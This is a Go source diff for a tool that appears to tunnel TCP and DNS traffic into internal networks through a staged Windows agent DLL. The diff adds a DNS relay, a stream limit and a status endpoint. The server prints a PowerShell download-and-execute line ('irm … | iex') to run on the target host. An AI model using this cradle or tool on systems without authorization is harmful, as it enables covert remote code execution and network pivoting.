@@ -5,11 +5,11 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/hex"
+	"encoding/json"
 	"encoding/pem"
 	"errors"
 	"flag"
 	"fmt"
-	"html/template"
 	"io"
 	"log"
 	"net"
@@ -22,6 +22,7 @@ import (
 	"sync"
 	"sync/atomic"
 	"syscall"
+	"text/template"
 	"time"
 
 	"github.com/psproxy/psproxy/internal/protocol"
@@ -38,6 +39,9 @@ func main() {
 	agentAssemblyFile := flag.String("agent-assembly-b64-file", "", "file containing compressed/base64 PSProxy.Agent.dll; defaults to release/agent_assembly.b64 when present")
 	redirect := flag.Bool("redirect", false, "install Linux iptables REDIRECT rules for --route CIDRs and relay original destinations through the agent")
 	redirectPort := flag.Int("redirect-port", 15080, "local transparent redirect listener port")
+	maxStreams := flag.Int("max-streams", 256, "maximum concurrent proxied TCP streams")
+	dnsListen := flag.String("dns-listen", "", "optional UDP DNS listener that forwards queries through the agent, e.g. 127.0.0.1:5353")
+	dnsTarget := flag.String("dns-target", "", "DNS server reachable by the agent for --dns-listen queries, e.g. 10.10.10.10:53")
 	tcpListen := flag.String("tcp-listen", "", "developer TCP relay listener, e.g. 127.0.0.1:1389")
 	tcpTarget := flag.String("tcp-target", "", "developer TCP relay target opened by the agent, e.g. 10.10.10.219:389")
 	routes := multiFlag{}
@@ -57,8 +61,14 @@ func main() {
 	if (*tcpListen == "") != (*tcpTarget == "") {
 		log.Fatal("--tcp-listen and --tcp-target must be supplied together")
 	}
+	if (*dnsListen == "") != (*dnsTarget == "") {
+		log.Fatal("--dns-listen and --dns-target must be supplied together")
+	}
 	if *redirect && len(routes) == 0 {
 		log.Fatal("--redirect requires at least one --route CIDR")
+	}
+	if err := validateRoutes(routes); err != nil {
+		log.Fatal(err)
 	}
 	pin, err := certPin(*cert)
 	if err != nil {
@@ -73,14 +83,15 @@ func main() {
 	}
 	tmpl := template.Must(template.ParseFiles(*agentTemplate))
 	store := staging.NewStore(*ttl)
-	sess, err := store.Create(*domain, *port, pin)
+	sess, err := store.Create(*domain, *port, pin, *dnsTarget)
 	if err != nil {
 		log.Fatal(err)
 	}
-	server := NewTunnelServer(store)
+	server := NewTunnelServer(store, *maxStreams)
 	mux := http.NewServeMux()
 	mux.HandleFunc("GET /a/{id}", staging.AgentHandler(store, tmpl, assembly))
 	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte("ok\n")) })
+	mux.HandleFunc("GET /status", statusHandler(server))
 	var redirectCleanup func()
 	if *redirect {
 		redirectCleanup = setupRedirectOrFatal(routes, *redirectPort)
@@ -89,6 +100,9 @@ func main() {
 	}
 	if *tcpListen != "" {
 		go serveTCPRelay(*tcpListen, *tcpTarget, server)
+	}
+	if *dnsListen != "" {
+		go serveDNSRelay(*dnsListen, server)
 	}
 	installSignalCleanup(redirectCleanup)
 	addr := fmt.Sprintf("%s:%d", *listen, *port)
@@ -102,18 +116,28 @@ func main() {
 	if *tcpListen != "" {
 		log.Printf("Developer TCP relay: %s -> agent -> %s", *tcpListen, *tcpTarget)
 	}
+	if *dnsListen != "" {
+		log.Printf("DNS relay: %s -> agent -> %s", *dnsListen, *dnsTarget)
+	}
 	log.Printf("Run this on the Windows host: irm %s/a/%s | iex", publicURL(*domain, *port), sess.ID)
 	log.Fatal(serveMixedTLS(addr, *cert, *key, mux, server))
 }
 
 type TunnelServer struct {
-	store   *staging.Store
-	mu      sync.Mutex
-	session *AgentSession
-	nextID  atomic.Uint64
+	store      *staging.Store
+	mu         sync.Mutex
+	session    *AgentSession
+	nextID     atomic.Uint64
+	dnsID      atomic.Uint64
+	maxStreams int
 }
 
-func NewTunnelServer(store *staging.Store) *TunnelServer { return &TunnelServer{store: store} }
+func NewTunnelServer(store *staging.Store, maxStreams int) *TunnelServer {
+	if maxStreams < 1 {
+		maxStreams = 1
+	}
+	return &TunnelServer{store: store, maxStreams: maxStreams}
+}
 
 func (s *TunnelServer) SetSession(a *AgentSession) {
 	s.mu.Lock()
@@ -127,13 +151,23 @@ func (s *TunnelServer) SetSession(a *AgentSession) {
 
 func (s *TunnelServer) Current() *AgentSession { s.mu.Lock(); defer s.mu.Unlock(); return s.session }
 
+func (s *TunnelServer) ClearSession(a *AgentSession) {
+	s.mu.Lock()
+	if s.session == a {
+		s.session = nil
+	}
+	s.mu.Unlock()
+}
+
 func (s *TunnelServer) OpenAttached(target string, local net.Conn) (*AgentSession, uint64, error) {
 	a := s.Current()
 	if a == nil {
 		return nil, 0, errors.New("no enrolled agent connected")
 	}
 	id := s.nextID.Add(1)
-	a.AttachLocal(id, local)
+	if err := a.AttachLocal(id, local); err != nil {
+		return nil, 0, err
+	}
 	if err := a.Open(id, target); err != nil {
 		a.RemoveLocal(id)
 		return nil, 0, err
@@ -142,21 +176,45 @@ func (s *TunnelServer) OpenAttached(target string, local net.Conn) (*AgentSessio
 }
 
 type AgentSession struct {
-	conn      net.Conn
-	br        *bufio.Reader
-	sendMu    sync.Mutex
-	closeOnce sync.Once
-	closed    chan struct{}
-	mu        sync.Mutex
-	pending   map[uint64]chan error
-	locals    map[uint64]net.Conn
+	conn       net.Conn
+	br         *bufio.Reader
+	sendMu     sync.Mutex
+	closeOnce  sync.Once
+	closed     chan struct{}
+	mu         sync.Mutex
+	pending    map[uint64]chan error
+	dnsPending map[uint64]chan []byte
+	locals     map[uint64]*localStream
+	maxStreams int
 }
 
-func NewAgentSession(c net.Conn, br *bufio.Reader) *AgentSession {
-	return &AgentSession{conn: c, br: br, closed: make(chan struct{}), pending: map[uint64]chan error{}, locals: map[uint64]net.Conn{}}
+func NewAgentSession(c net.Conn, br *bufio.Reader, maxStreams int) *AgentSession {
+	if maxStreams < 1 {
+		maxStreams = 1
+	}
+	return &AgentSession{conn: c, br: br, closed: make(chan struct{}), pending: map[uint64]chan error{}, dnsPending: map[uint64]chan []byte{}, locals: map[uint64]*localStream{}, maxStreams: maxStreams}
 }
 
-func (a *AgentSession) Close() { a.closeOnce.Do(func() { close(a.closed); _ = a.conn.Close() }) }
+func (a *AgentSession) Close() {
+	a.closeOnce.Do(func() {
+		close(a.closed)
+		_ = a.conn.Close()
+		a.mu.Lock()
+		for id, ch := range a.pending {
+			delete(a.pending, id)
+			ch <- errors.New("agent session closed")
+		}
+		for id, ch := range a.dnsPending {
+			delete(a.dnsPending, id)
+			close(ch)
+		}
+		for id, ls := range a.locals {
+			delete(a.locals, id)
+			ls.close()
+		}
+		a.mu.Unlock()
+	})
+}
 
 func (a *AgentSession) send(f protocol.Frame) error {
 	a.sendMu.Lock()
@@ -186,16 +244,29 @@ func (a *AgentSession) Open(id uint64, target string) error {
 	}
 }
 
-func (a *AgentSession) AttachLocal(id uint64, c net.Conn) {
+func (a *AgentSession) AttachLocal(id uint64, c net.Conn) error {
 	a.mu.Lock()
-	a.locals[id] = c
-	a.mu.Unlock()
+	defer a.mu.Unlock()
+	select {
+	case <-a.closed:
+		return errors.New("agent session closed")
+	default:
+	}
+	if len(a.locals) >= a.maxStreams {
+		return fmt.Errorf("maximum concurrent streams reached: %d", a.maxStreams)
+	}
+	a.locals[id] = newLocalStream(c)
+	return nil
 }
 
 func (a *AgentSession) RemoveLocal(id uint64) {
 	a.mu.Lock()
+	ls := a.locals[id]
 	delete(a.locals, id)
 	a.mu.Unlock()
+	if ls != nil {
+		ls.close()
+	}
 }
 
 func (a *AgentSession) Run() {
@@ -225,22 +296,159 @@ func (a *AgentSession) Run() {
 			}
 		case protocol.FrameData:
 			a.mu.Lock()
-			c := a.locals[f.StreamID]
+			ls := a.locals[f.StreamID]
 			a.mu.Unlock()
-			if c != nil {
-				_, _ = c.Write(f.Payload)
+			if ls != nil && !ls.enqueue(f.Payload) {
+				a.RemoveLocal(f.StreamID)
+				_ = a.send(protocol.Frame{StreamID: f.StreamID, Type: protocol.FrameClose})
 			}
 		case protocol.FrameClose:
+			a.RemoveLocal(f.StreamID)
+		case protocol.FrameDNSReply:
 			a.mu.Lock()
-			c := a.locals[f.StreamID]
-			delete(a.locals, f.StreamID)
+			ch := a.dnsPending[f.StreamID]
+			delete(a.dnsPending, f.StreamID)
 			a.mu.Unlock()
-			if c != nil {
-				_ = c.Close()
+			if ch != nil {
+				ch <- f.Payload
 			}
 		case protocol.FramePing:
 			_ = a.send(protocol.Frame{StreamID: f.StreamID, Type: protocol.FramePong})
 		}
+	}
+}
+
+type localStream struct {
+	conn net.Conn
+	ch   chan []byte
+	done chan struct{}
+	once sync.Once
+}
+
+func newLocalStream(c net.Conn) *localStream {
+	ls := &localStream{conn: c, ch: make(chan []byte, 32), done: make(chan struct{})}
+	go ls.writeLoop()
+	return ls
+}
+
+func (l *localStream) enqueue(payload []byte) bool {
+	buf := append([]byte(nil), payload...)
+	select {
+	case l.ch <- buf:
+		return true
+	case <-l.done:
+		return false
+	default:
+		return false
+	}
+}
+
+func (l *localStream) writeLoop() {
+	defer l.close()
+	for {
+		select {
+		case payload := <-l.ch:
+			if _, err := l.conn.Write(payload); err != nil {
+				return
+			}
+		case <-l.done:
+			return
+		}
+	}
+}
+
+func (l *localStream) close() {
+	l.once.Do(func() {
+		close(l.done)
+		_ = l.conn.Close()
+	})
+}
+
+func (s *TunnelServer) Status() map[string]any {
+	a := s.Current()
+	status := map[string]any{"agent_connected": a != nil, "max_streams": s.maxStreams}
+	if a != nil {
+		a.mu.Lock()
+		status["active_streams"] = len(a.locals)
+		status["pending_opens"] = len(a.pending)
+		status["pending_dns"] = len(a.dnsPending)
+		a.mu.Unlock()
+	}
+	return status
+}
+
+func (s *TunnelServer) QueryDNS(query []byte) ([]byte, error) {
+	a := s.Current()
+	if a == nil {
+		return nil, errors.New("no enrolled agent connected")
+	}
+	id := s.dnsID.Add(1)
+	ch := make(chan []byte, 1)
+	a.mu.Lock()
+	select {
+	case <-a.closed:
+		a.mu.Unlock()
+		return nil, errors.New("agent session closed")
+	default:
+	}
+	a.dnsPending[id] = ch
+	a.mu.Unlock()
+	if err := a.send(protocol.Frame{StreamID: id, Type: protocol.FrameDNSQuery, Payload: query}); err != nil {
+		a.mu.Lock()
+		delete(a.dnsPending, id)
+		a.mu.Unlock()
+		return nil, err
+	}
+	select {
+	case resp, ok := <-ch:
+		if !ok {
+			return nil, errors.New("agent session closed")
+		}
+		if len(resp) == 0 {
+			return nil, errors.New("empty DNS response from agent")
+		}
+		return resp, nil
+	case <-time.After(5 * time.Second):
+		a.mu.Lock()
+		delete(a.dnsPending, id)
+		a.mu.Unlock()
+		return nil, errors.New("timeout waiting for DNS response")
+	}
+}
+
+func statusHandler(server *TunnelServer) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_ = json.NewEncoder(w).Encode(server.Status())
+	}
+}
+
+func serveDNSRelay(listenAddr string, server *TunnelServer) {
+	addr, err := net.ResolveUDPAddr("udp", listenAddr)
+	if err != nil {
+		log.Fatalf("dns relay resolve failed: %v", err)
+	}
+	conn, err := net.ListenUDP("udp", addr)
+	if err != nil {
+		log.Fatalf("dns relay listen failed: %v", err)
+	}
+	log.Printf("dns relay listening on udp://%s", listenAddr)
+	buf := make([]byte, 4096)
+	for {
+		n, client, err := conn.ReadFromUDP(buf)
+		if err != nil {
+			log.Printf("dns relay read failed: %v", err)
+			continue
+		}
+		query := append([]byte(nil), buf[:n]...)
+		go func() {
+			resp, err := server.QueryDNS(query)
+			if err != nil {
+				log.Printf("dns relay query failed: %v", err)
+				return
+			}
+			_, _ = conn.WriteToUDP(resp, client)
+		}()
 	}
 }
 
@@ -297,6 +505,15 @@ func originalDst(c net.Conn) (string, error) {
 		return "", errors.New("empty original destination")
 	}
 	return target, nil
+}
+
+func validateRoutes(routes []string) error {
+	for _, route := range routes {
+		if _, _, err := net.ParseCIDR(route); err != nil {
+			return fmt.Errorf("invalid --route CIDR %q: %w", route, err)
+		}
+	}
+	return nil
 }
 
 func setupRedirectOrFatal(routes []string, port int) func() {
@@ -434,16 +651,27 @@ func handleAgent(conn net.Conn, br *bufio.Reader, server *TunnelServer) {
 		_ = conn.Close()
 		return
 	}
-	if err := server.store.Enroll(strings.TrimSpace(strings.TrimPrefix(line, prefix))); err != nil {
+	fields := strings.Fields(strings.TrimPrefix(line, prefix))
+	if len(fields) == 0 {
+		_ = conn.Close()
+		return
+	}
+	enrollToken := fields[0]
+	reconnectToken := ""
+	if len(fields) > 1 {
+		reconnectToken = fields[1]
+	}
+	if err := server.store.Authenticate(enrollToken, reconnectToken); err != nil {
 		log.Printf("agent enrollment failed: %v", err)
 		_ = conn.Close()
 		return
 	}
-	a := NewAgentSession(conn, br)
+	a := NewAgentSession(conn, br, server.maxStreams)
 	server.SetSession(a)
 	log.Printf("agent enrolled and connected from %s", conn.RemoteAddr())
 	_ = a.send(protocol.Frame{Type: protocol.FramePong, Payload: []byte("OK")})
 	a.Run()
+	server.ClearSession(a)
 }
 
 type singleListener struct {
@@ -454,7 +682,6 @@ type singleListener struct {
 
 func (s *singleListener) Accept() (net.Conn, error) {
 	if s.conn == nil {
-		<-s.done
 		return nil, io.EOF
 	}
 	c := s.conn
